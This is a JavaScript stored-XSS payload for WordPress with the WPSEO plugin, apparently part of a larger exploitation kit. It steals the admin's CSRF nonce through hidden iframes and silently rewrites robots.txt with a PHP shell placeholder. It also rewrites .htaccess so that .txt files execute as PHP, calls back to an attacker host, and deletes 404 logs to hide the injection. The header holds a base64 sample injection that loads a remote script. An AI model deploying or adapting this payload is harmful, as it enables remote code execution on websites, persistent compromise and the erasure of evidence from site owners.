/*
Title: WordPress WPSEO Payload (Robots.txt and .htaccess)
Author: Hans-Michael Varbaek
Company: VarBITS

Version: 2.75

Changelog:
- Ver 2.75 : Made various minor improvements.
- Ver 2.5  : Added XMLHttpRequest for JS Notification.
- Ver 2.0  : First release.

Special Credits: InterN0T and Sense of Security (Versions 2.0 to 2.5)

Requirements:
1) Ability to edit "robots.txt" and ".htaccess" within WPSEO. (Default feature)
2) Apache is not configured with "AllowOverride None" for the document root. (Default, but often changed.)

This payload was originally developed for:
* Better WP Security - Stored XSS (Old Exploit - See Exploit-DB)

Sample Injection Payload:
"><script>document.write(atob(/PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LjkyLjE0OC94c3MuanMiPjwvc2NyaXB0Pg==/.source))</script>
The above JavaScript writes a new script tag as follows: <script src="http://192.168.1.1/xss.js"></script>

This is because WordPress or WPSEO is filtering unencoded script tags.

For ethical and legal purposes only. This script is provided as is and without warranty.

TODO:
- For pre-existing forms, consider using FormData to read and update/set new values in the future:
https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
https://developer.mozilla.org/en-US/docs/Web/API/FormData
https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
-- Update or add another payload which uses FormData() and XMLHttpRequest()
*/

var robots_shell = '<?php PHP_PAYLOAD ?>';
// The python script automatically updates the PHP_PAYLOAD placeholder variable
var htacces_shell = "AddHandler application/x-httpd-php .txt";
// Execute .txt files as PHP - On some servers it needs to be: application/x-httpd-php5
// TODO: Maybe add another line that specifies "php5/6/7" if it doesn't cause any errors.

// STAGE 1 - Inject into robots.txt
// noinspection JSUnusedGlobalSymbols
function silent_robots_inject() {
    //if (document.cookie.indexOf("Robots_Infected") == -1) {
    // TODO: Make the "Robots_Infected" cookie name a function argument for silent_robots_inject()
    if (!document.cookie.match(/^(.*;)?\s*Robots_Infected\s*=\s*[^;]+(.*)?$/)) {

        // Read and save the relevant "_wpnonce" - Bypass CSRF protection
        // TODO: Consider generating the correct "nonce"-reading code below, which depends on the WordPress version in use.
        // TODO Note: For some reason "_wpnonce" was not changed to "nonce" by WPSEO. Later versions of WPSEO may utilize "nonce".
        // noinspection Annotator
        var robots_wpnonce = document.getElementById('silent_robots_frame').contentDocument.getElementById('robotstxtform')._wpnonce.value; // WP Nonce / CSRF Token
        var robots_contents = document.getElementById('silent_robots_frame').contentDocument.getElementsByTagName('textarea')[0].value; // Current contents of robots.txt

        // TODO: Use the pre-existing form in the future if possible. Consider switching to FormData()
        // Prepoulated form
        var robots_input = '\
        <input type="hidden" name="_wpnonce" value="'+robots_wpnonce+'" />\
        <input type="hidden" name="_wp_http_referer" value="%2Fwp-admin%2Fadmin.php%3Fpage%3Dwpseo_tools&amp;tool%3Dfile-editor" />\
        <input type="hidden" name="robotsnew" value=\''+robots_contents+'\r\n'+robots_shell+'\' />\
        <input type="hidden" name="submitrobots" value="Save+changes+to+Robots.txt" />\
        ';

        // Inject our prepopulated form into the iframe
        silent_form_inject('admin.php?page=wpseo_tools&tool=file-editor', 'POST', robots_input, 'silent_robots_frame', 'robots_haxx');

        // Submit our payload - There's no turning back now
        top.document.getElementById('silent_robots_frame').contentDocument.getElementById('robots_haxx').submit();

        // TODO: Maybe change the cookie name and value in the future.
        SetCookie("Robots_Infected", "true"); // Prevent re-infection / loops
    }
}

// STAGE 2 - Inject into .htaccess
// noinspection JSUnusedGlobalSymbols
function silent_htaccess_inject() {
    //if (document.cookie.indexOf("Htaccess_Infected") == -1) {
    // TODO: Make the "Htaccess_Infected" cookie name a function argument for silent_htaccess_inject()
    if (!document.cookie.match(/^(.*;)?\s*Htaccess_Infected\s*=\s*[^;]+(.*)?$/)) {

        // Read and save the relevant "_wpnonce" - Bypass CSRF protection
        // TODO: Consider generating the correct "nonce"-reading code below, which depends on the WordPress version in use.
        // TODO Note: For some reason "_wpnonce" was not changed to "nonce" by WPSEO. Current versions may utilise "nonce".
        // noinspection Annotator
        var htaccess_wpnonce = document.getElementById('silent_htaccess_frame').contentDocument.getElementById('htaccessform')._wpnonce.value; // WP Nonce / CSRF Token
        var htaccess_contents = document.getElementById('silent_htaccess_frame').contentDocument.getElementsByTagName('textarea')[1].value; // Current contents of .htaccess

        // TODO: Use the pre-existing form in the future if possible. Consider switching to FormData()
        // Prepopulated form
        var htaccess_input = '\
        <input type="hidden" name="_wpnonce" value="'+htaccess_wpnonce+'" />\
        <input type="hidden" name="_wp_http_referer" value="%2Fwp-admin%2Fadmin.php%3Fpage%3Dwpseo_tools&amp;tool%3Dfile-editor" />\
        <input type="hidden" name="htaccessnew" value=\''+htaccess_contents+'\r\n'+htacces_shell+'\' />\
        <input type="hidden" name="submithtaccess" value="Save+changes+to+.htaccess" />\
        ';

        // Inject our prepopulated form into the iframe
        silent_form_inject('admin.php?page=wpseo_tools&tool=file-editor', 'POST', htaccess_input, 'silent_htaccess_frame', 'htaccess_haxx');

        // Submit our payload - There's no turning back now
        top.document.getElementById('silent_htaccess_frame').contentDocument.getElementById('htaccess_haxx').submit();

        // TODO: Maybe change the cookie name and value in the future.
        SetCookie("Htaccess_Infected", "true"); // Prevent re-infection / loops

        var request = new XMLHttpRequest(); // Initiate XMLHttpRequest
        request.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
        // Method and URL to send the request to - Hostname and port are set by: xsser.py
        request.send(); // Send the request

        // Give our script two seconds to execute and inject the prepopulated forms before self-removal.
        // Timeout changed from 5 seconds to 2 seconds - Version 2.5
        // Old method: var end = setTimeout("clean_up()", 2000);
        setTimeout(function() {
            clean_up();
        }, 2000);

    }
}

// ============================================= FUNCTIONS START ============================================= \\

// Injects the main hidden iframes into the page
// USAGE: main_frame_inject("Robots_Infected", "silent_robots_frame", "silent_robots_inject()", "admin.php?page=wpseo_files");
function main_frame_inject(cookiename, identifier, function_name, get_page) {
    //if (document.cookie.indexOf(cookiename) == -1) {
    var re_cookie = new RegExp('^(.*;)?\\s*'+cookiename+'\\s*=\\s*[^;]+(.*)?$');
    if (!document.cookie.match(re_cookie)) {

        // Append a (hidden) iframe to the HTML body for data injection
        var mainframe = document.createElement("iframe");
        mainframe.setAttribute('id', identifier);
        top.document.body.appendChild(mainframe);
        mainframe.setAttribute('onload', function_name);
        mainframe.setAttribute('style', 'visibility:hidden;display:none');
        mainframe.setAttribute('src', get_page);
    }
}

// Injects a hidden form with prepopulated data
// USAGE: silent_form_inject("admin.php?page=wpseo_files", "POST", htaccess_input, "silent_htaccess_frame", "htaccess_haxx");
function silent_form_inject(action, method, content, framename, identifier) {
    var silent_main_tag = document.createElement('form');

    // The inner contents of our form is equal to the content variable
    silent_main_tag.innerHTML = ' '+content;
    top.document.getElementById(framename).contentDocument.body.appendChild(silent_main_tag);
    silent_main_tag.setAttribute('id', identifier);
    silent_main_tag.setAttribute('name', 'BlackHat2017'); // Changed name version 2.75
    silent_main_tag.setAttribute('action', action);
    silent_main_tag.setAttribute('method', method);
}

// Sets a cookie with a very long expiration time
// USAGE: SetCookie("Htaccess_Infected", "true");
// TODO: Look into HTML5 Storage instead of cookies maybe.
function SetCookie(cookieName, cookieContent) {
    var cookiePath = '/';
    var expDate=new Date();
    expDate.setTime(expDate.getTime()+372800000);
    var expires=expDate.toUTCString();
    document.cookie=cookieName+"="+encodeURIComponent(cookieContent)+";path="+encodeURI(cookiePath)+";expires="+expires;
    // Replaced escape() as it was deprecated.
}

// NOTE: This function should always be executed after the final stage.
// Delete all 404 log errors - Including the injected payload(s)
// This clean up function is only valid for Better WP Security.
// TODO: Replace the contents of this function with a "place-holder" variable in the next version.
// TODO: This variable, is then replaced, depending on the component being exploited.
// USAGE: clean_up()
function clean_up() {
    // noinspection JSUndefinedPropertyAssignment
    document.getElementById('404s').checked=true;
    document.forms[0].submit();
}

// ============================================= FUNCTIONS END ============================================= \\

// STAGE 1 - Robots.txt
main_frame_inject("Robots_Infected", "silent_robots_frame", "silent_robots_inject()", "admin.php?page=wpseo_tools&tool=file-editor");

// STAGE 2 - .Htaccess
main_frame_inject("Htaccess_Infected", "silent_htaccess_frame", "silent_htaccess_inject()", "admin.php?page=wpseo_tools&tool=file-editor");
